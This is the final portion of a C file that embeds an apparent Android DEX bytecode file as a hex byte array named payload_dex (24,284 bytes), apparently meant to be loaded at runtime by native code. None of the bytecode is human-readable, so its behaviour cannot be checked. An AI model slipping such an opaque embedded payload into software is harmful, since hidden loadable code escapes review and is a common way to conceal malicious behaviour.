    0x7d, 0x00, 0x02, 0x40, 0x01, 0xa1, 0x03, 0x1a, 0x8c, 0x02, 0x41, 0x02, 0xc3, 0x01, 0x04, 0x00, 
    0xae, 0x02, 0x1e, 0x02, 0x44, 0x01, 0xa1, 0x03, 0x1c, 0x01, 0x17, 0x06, 0x02, 0x40, 0x01, 0xa1, 
    0x03, 0x1a, 0x80, 0x02, 0x40, 0x01, 0xa1, 0x03, 0x1a, 0x7f, 0x02, 0x43, 0x02, 0xc3, 0x01, 0x1c, 
    0x01, 0x44, 0x10, 0x80, 0x00, 0xaf, 0x02, 0x1c, 0x01, 0x1e, 0x02, 0x40, 0x01, 0xa1, 0x03, 0x1a, 
    0x9a, 0x02, 0x43, 0x02, 0xc3, 0x01, 0x1c, 0x02, 0x44, 0x10, 0x80, 0x00, 0x24, 0x10, 0x10, 0xaf, 
    0x02, 0x1c, 0x02, 0x1e, 0x1e, 0x02, 0x40, 0x01, 0xa1, 0x03, 0x1a, 0xa0, 0x02, 0x40, 0x01, 0xa1, 
    0x03, 0x1a, 0xbc, 0x02, 0x40, 0x01, 0xa1, 0x03, 0x1a, 0xb5, 0x02, 0x41, 0x02, 0xc3, 0x01, 0x04, 
    0x19, 0xae, 0x02, 0x17, 0xd2, 0x02, 0x3f, 0x01, 0xa1, 0x03, 0x18, 0x3e, 0x02, 0x41, 0x02, 0xc3, 
    0x01, 0x04, 0x19, 0xae, 0x02, 0x17, 0xe5, 0x02, 0x41, 0x02, 0xc3, 0x01, 0x04, 0x19, 0xae, 0x02, 
    0x37, 0x22, 0x01, 0x02, 0x41, 0x02, 0xc3, 0x01, 0x04, 0x19, 0xae, 0x02, 0x37, 0x2b, 0x01, 0x02, 
    0x41, 0x02, 0xc3, 0x01, 0x04, 0x19, 0xae, 0x02, 0x37, 0x87, 0x01, 0x02, 0x41, 0x02, 0xc3, 0x01, 
    0x04, 0x19, 0xae, 0x02, 0x37, 0x88, 0x01, 0x02, 0x41, 0x02, 0xc3, 0x01, 0x04, 0x19, 0xae, 0x02, 
    0x37, 0xac, 0x01, 0x02, 0x42, 0x01, 0xa1, 0x03, 0x1c, 0x07, 0x18, 0x37, 0x18, 0x38, 0x18, 0x39, 
    0x18, 0x3a, 0x18, 0x3b, 0x18, 0x3c, 0x18, 0x3d, 0x00, 0x01, 0x0b, 0x05, 0x0f, 0x12, 0x4f, 0x81, 
    0x80, 0x04, 0xfc, 0x33, 0x01, 0x89, 0x02, 0x00, 0x01, 0x89, 0x02, 0x00, 0x01, 0x89, 0x02, 0x00, 
    0x02, 0x89, 0x02, 0x00, 0x02, 0x89, 0x02, 0x00, 0x01, 0x89, 0x02, 0x00, 0x01, 0x89, 0x02, 0x00, 
    0x02, 0x89, 0x02, 0x00, 0x01, 0x89, 0x02, 0x00, 0x0e, 0x89, 0x02, 0x00, 0x59, 0x00, 0xe0, 0x33, 
    0x03, 0x04, 0xe4, 0x34, 0x01, 0x01, 0x84, 0x35, 0x03, 0x01, 0x9c, 0x35, 0x01, 0x01, 0xb4, 0x35, 
    0x00, 0x00, 0x01, 0x01, 0x6a, 0x80, 0x80, 0x04, 0xe0, 0x35, 0x6b, 0x01, 0xf8, 0x35, 0x00, 0x01, 
    0x01, 0x01, 0x10, 0x90, 0x20, 0x6c, 0x80, 0x80, 0x04, 0xf0, 0x36, 0x6d, 0x01, 0xb8, 0x36, 0x00, 
    0x00, 0x01, 0x01, 0x6e, 0x80, 0x80, 0x04, 0xbc, 0x37, 0x6f, 0x01, 0x8c, 0x37, 0x00, 0x00, 0x01, 
    0x01, 0x70, 0x80, 0x80, 0x04, 0xd4, 0x37, 0x71, 0x01, 0xec, 0x37, 0x00, 0x00, 0x01, 0x01, 0x72, 
    0x80, 0x80, 0x04, 0x84, 0x38, 0x73, 0x01, 0x9c, 0x38, 0x13, 0x00, 0x1b, 0x00, 0x11, 0x1a, 0x01, 
    0x1a, 0x01, 0x1a, 0x01, 0x1a, 0x01, 0x1a, 0x01, 0x1a, 0x01, 0x1a, 0x01, 0x1a, 0x01, 0x1a, 0x01, 
    0x1a, 0x01, 0x1a, 0x01, 0x1a, 0x01, 0x1a, 0x01, 0x0a, 0x01, 0x0a, 0x01, 0x0a, 0x01, 0x0a, 0x01, 
    0x0a, 0x01, 0x0a, 0x74, 0xc8, 0x20, 0xb4, 0x38, 0x01, 0xc8, 0x20, 0x88, 0x3d, 0x01, 0xc8, 0x20, 
    0xe8, 0x44, 0x01, 0xc8, 0x20, 0x80, 0x45, 0x01, 0xc8, 0x20, 0xd4, 0x41, 0x01, 0x82, 0x80, 0x04, 
    0x98, 0x45, 0x01, 0x0a, 0xb0, 0x45, 0x01, 0x08, 0xb8, 0x46, 0x01, 0x0a, 0xd4, 0x46, 0x01, 0x0a, 
    0x88, 0x47, 0x01, 0x0a, 0xe4, 0x40, 0x01, 0x0a, 0xc0, 0x3f, 0x01, 0x0a, 0xa0, 0x3d, 0x01, 0x0a, 
    0xa8, 0x42, 0x01, 0x0a, 0x84, 0x3c, 0x01, 0x0a, 0xb4, 0x39, 0x01, 0x0a, 0xf0, 0x47, 0x01, 0x0a, 
    0xcc, 0x42, 0x01, 0x0a, 0x88, 0x43, 0x01, 0x0a, 0xdc, 0x43, 0x01, 0x0a, 0xf0, 0x41, 0x01, 0x0a, 
    0xcc, 0x38, 0x01, 0x0a, 0xf4, 0x38, 0x01, 0x0a, 0xac, 0x44, 0x01, 0x0a, 0xf8, 0x48, 0x01, 0x08, 
    0x9c, 0x4a, 0x01, 0x08, 0xc0, 0x4a, 0x00, 0x01, 0x01, 0x07, 0x24, 0x90, 0x20, 0x8f, 0x01, 0x80, 
    0x80, 0x04, 0xe0, 0x4b, 0x90, 0x01, 0x01, 0xfc, 0x4b, 0x01, 0x01, 0x90, 0x4c, 0x01, 0x01, 0xb0, 
    0x4c, 0x01, 0x01, 0xc4, 0x4c, 0x01, 0x01, 0xdc, 0x4c, 0x01, 0x01, 0xf0, 0x4c, 0x01, 0x01, 0x88, 
    0x4d, 0x00, 0x02, 0x01, 0x01, 0x25, 0x90, 0x20, 0x01, 0x90, 0x20, 0x97, 0x01, 0x80, 0x80, 0x04, 
    0xa0, 0x4d, 0x98, 0x01, 0x01, 0xc0, 0x4d, 0x00, 0x00, 0x01, 0x01, 0x99, 0x01, 0x80, 0x80, 0x04, 
    0xdc, 0x4d, 0x9a, 0x01, 0x01, 0xf4, 0x4d, 0x01, 0x00, 0x07, 0x00, 0x27, 0x4a, 0x9b, 0x01, 0xc8, 
    0x20, 0xd4, 0x4e, 0x01, 0xc8, 0x20, 0xdc, 0x50, 0x01, 0x82, 0x80, 0x04, 0xd8, 0x52, 0x01, 0x0a, 
    0xf8, 0x50, 0x01, 0x0a, 0xf0, 0x4e, 0x01, 0x09, 0xf0, 0x52, 0x01, 0x0a, 0x8c, 0x52, 0x00, 0x01, 
    0x01, 0x01, 0x28, 0x90, 0x20, 0xa2, 0x01, 0x80, 0x80, 0x04, 0xac, 0x53, 0xa3, 0x01, 0x01, 0xc8, 
    0x53, 0x00, 0x01, 0x01, 0x01, 0x29, 0x90, 0x20, 0xa4, 0x01, 0x80, 0x80, 0x04, 0xa8, 0x57, 0xa5, 
    0x01, 0x01, 0xa0, 0x54, 0x12, 0x00, 0x18, 0x00, 0x2a, 0x1a, 0x01, 0x1a, 0x01, 0x1a, 0x01, 0x0a, 
    0x01, 0x08, 0x01, 0x0a, 0x01, 0x0a, 0x01, 0x0a, 0x01, 0x0a, 0x01, 0x08, 0x01, 0x0a, 0x01, 0x1a, 
    0x01, 0x0a, 0x01, 0x0a, 0x01, 0x0a, 0x01, 0x0a, 0x01, 0x0a, 0x01, 0x0a, 0xa6, 0x01, 0xc8, 0x20, 
    0xc4, 0x57, 0x01, 0xc8, 0x20, 0xf8, 0x58, 0x01, 0xc8, 0x20, 0xa4, 0x59, 0x01, 0xc8, 0x20, 0xdc, 
    0x57, 0x01, 0xc8, 0x20, 0xbc, 0x59, 0x01, 0xc8, 0x20, 0xd4, 0x59, 0x01, 0xc8, 0x20, 0xec, 0x59, 
    0x01, 0xc8, 0x20, 0x84, 0x5a, 0x01, 0x88, 0x80, 0x04, 0x9c, 0x5a, 0x01, 0x82, 0x80, 0x04, 0xc4, 
    0x5a, 0x01, 0x09, 0xdc, 0x5a, 0x01, 0x09, 0x94, 0x5b, 0x01, 0x09, 0xb4, 0x5b, 0x01, 0x09, 0x94, 
    0x5e, 0x01, 0x0a, 0xb0, 0x5f, 0x01, 0x0a, 0xb8, 0x60, 0x01, 0x09, 0x90, 0x59, 0x01, 0x0a, 0xf4, 
    0x57, 0x01, 0x09, 0xd4, 0x61, 0x01, 0x0a, 0xe8, 0x61, 0x01, 0x0a, 0xf0, 0x62, 0x01, 0x0a, 0xa4, 
    0x63, 0x01, 0x0a, 0xbc, 0x64, 0x01, 0x0a, 0xec, 0x64, 0x07, 0x00, 0x01, 0x00, 0x3c, 0x09, 0x01, 
    0x09, 0x01, 0x09, 0x01, 0x09, 0x01, 0x09, 0x01, 0x09, 0x01, 0x09, 0xbe, 0x01, 0x82, 0x80, 0x04, 
    0xe0, 0x69, 0x02, 0x00, 0x01, 0x00, 0x43, 0x09, 0x01, 0x09, 0xbf, 0x01, 0x82, 0x80, 0x04, 0xf8, 
    0x69, 0x01, 0x00, 0x01, 0x00, 0x45, 0x09, 0xc0, 0x01, 0x82, 0x80, 0x04, 0x90, 0x6a, 0x02, 0x00, 
    0x01, 0x00, 0x46, 0x09, 0x01, 0x09, 0xc1, 0x01, 0x82, 0x80, 0x04, 0xa8, 0x6a, 0x01, 0x00, 0x01, 
    0x00, 0x48, 0x09, 0xc2, 0x01, 0x82, 0x80, 0x04, 0xc0, 0x6a, 0x01, 0x00, 0x01, 0x00, 0x49, 0x09, 
    0xc3, 0x01, 0x82, 0x80, 0x04, 0xd8, 0x6a, 0x02, 0x00, 0x01, 0x00, 0x4a, 0x09, 0x01, 0x09, 0xc4, 
    0x01, 0x82, 0x80, 0x04, 0xf0, 0x6a, 0x00, 0x00, 0x01, 0x00, 0xc5, 0x01, 0x82, 0x80, 0x04, 0x88, 
    0x6b, 0x0d, 0x64, 0xed, 0x6f, 0x2f, 0xff, 0x64, 0x00, 0x00, 0x00, 0x1f, 0x64, 0x00, 0x00, 0x00, 
    0x14, 0x44, 0xf8, 0xf6, 0xf4, 0x64, 0x11, 0x11, 0x11, 0xff, 0x04, 0xff, 0x64, 0x73, 0x6a, 0x64, 
    0xff, 0x44, 0xfd, 0xfb, 0xfb, 0x64, 0x1d, 0x18, 0x16, 0xff, 0x04, 0x02, 0x04, 0x00, 0x04, 0x01, 
    0x17, 0x31, 0x04, 0x64, 0x00, 0x00, 0x00, 0x80, 0x04, 0x14, 0x17, 0x9a, 0x04, 0xff, 0x07, 0x64, 
    0x00, 0x00, 0x01, 0x7f, 0x64, 0x01, 0x00, 0x01, 0x7f, 0x64, 0x02, 0x00, 0x01, 0x7f, 0x64, 0x03, 
    0x00, 0x01, 0x7f, 0x64, 0x04, 0x00, 0x01, 0x7f, 0x64, 0x05, 0x00, 0x01, 0x7f, 0x64, 0x06, 0x00, 
    0x01, 0x7f, 0x02, 0x64, 0x01, 0x00, 0x02, 0x7f, 0x64, 0x02, 0x00, 0x02, 0x7f, 0x01, 0x64, 0x00, 
    0x00, 0x03, 0x7f, 0x02, 0x64, 0x00, 0x00, 0x04, 0x7f, 0x64, 0x01, 0x00, 0x04, 0x7f, 0x01, 0x64, 
    0x00, 0x00, 0x05, 0x7f, 0x01, 0x64, 0x00, 0x00, 0x06, 0x7f, 0x02, 0x64, 0x00, 0x00, 0x07, 0x7f, 
    0x64, 0x01, 0x00, 0x07, 0x7f, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xc2, 0x57, 0x00, 0x00, 
    0xc9, 0x57, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xd3, 0x57, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0xdc, 0x57, 0x00, 0x00, 0xc9, 0x57, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xe3, 0x57, 0x00, 0x00, 
    0xc9, 0x57, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xea, 0x57, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0xfa, 0x57, 0x00, 0x00, 0xc9, 0x57, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x01, 0x58, 0x00, 0x00, 
    0xd3, 0x57, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x15, 0x58, 0x00, 0x00, 0xc9, 0x57, 0x00, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0x1c, 0x58, 0x00, 0x00, 0xc9, 0x57, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0x23, 0x58, 0x00, 0x00, 0xc9, 0x57, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x35, 0x58, 0x00, 0x00, 
    0x2a, 0x58, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x35, 0x58, 0x00, 0x00, 0x3c, 0x58, 0x00, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0x35, 0x58, 0x00, 0x00, 0x47, 0x58, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 
    0x35, 0x58, 0x00, 0x00, 0x53, 0x58, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x35, 0x58, 0x00, 0x00, 
    0x5f, 0x58, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x35, 0x58, 0x00, 0x00, 0x6b, 0x58, 0x00, 0x00, 
    0x02, 0x00, 0x00, 0x00, 0x35, 0x58, 0x00, 0x00, 0x77, 0x58, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
    0x83, 0x58, 0x00, 0x00, 0x08, 0x5c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x1c, 0x5c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x6c, 0x00, 0x00, 0x00, 0x14, 0x5c, 0x00, 0x00, 0x1c, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x28, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3c, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8f, 0x00, 0x00, 0x00, 
    0x34, 0x5c, 0x00, 0x00, 0x3c, 0x5c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x97, 0x00, 0x00, 0x00, 0x48, 0x5c, 0x00, 0x00, 0x54, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa2, 0x00, 0x00, 0x00, 
    0x14, 0x5c, 0x00, 0x00, 0x6c, 0x5c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00, 0x00, 0x14, 0x5c, 0x00, 0x00, 0x78, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9c, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa8, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb4, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xcc, 0x5c, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 
    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
    0xaf, 0x01, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x63, 0x00, 0x00, 0x00, 
    0x2c, 0x07, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x66, 0x00, 0x00, 0x00, 0xb8, 0x08, 0x00, 0x00, 
    0x04, 0x00, 0x00, 0x00, 0x4c, 0x00, 0x00, 0x00, 0x80, 0x0d, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 
    0xe8, 0x00, 0x00, 0x00, 0xe0, 0x0f, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 
    0x20, 0x17, 0x00, 0x00, 0x01, 0x20, 0x00, 0x00, 0x62, 0x00, 0x00, 0x00, 0xe0, 0x19, 0x00, 0x00, 
    0x03, 0x20, 0x00, 0x00, 0x45, 0x00, 0x00, 0x00, 0xa0, 0x35, 0x00, 0x00, 0x01, 0x10, 0x00, 0x00, 
    0x37, 0x00, 0x00, 0x00, 0x70, 0x38, 0x00, 0x00, 0x02, 0x20, 0x00, 0x00, 0xaf, 0x01, 0x00, 0x00, 
    0x60, 0x3a, 0x00, 0x00, 0x04, 0x20, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0xc2, 0x57, 0x00, 0x00, 
    0x00, 0x20, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x98, 0x58, 0x00, 0x00, 0x05, 0x20, 0x00, 0x00, 
    0x09, 0x00, 0x00, 0x00, 0x71, 0x5b, 0x00, 0x00, 0x03, 0x10, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 
    0x08, 0x5c, 0x00, 0x00, 0x06, 0x20, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0xd4, 0x5c, 0x00, 0x00, 
    0x00, 0x10, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0c, 0x5e, 0x00, 0x00
};
const unsigned int payload_dex_size = 24284;
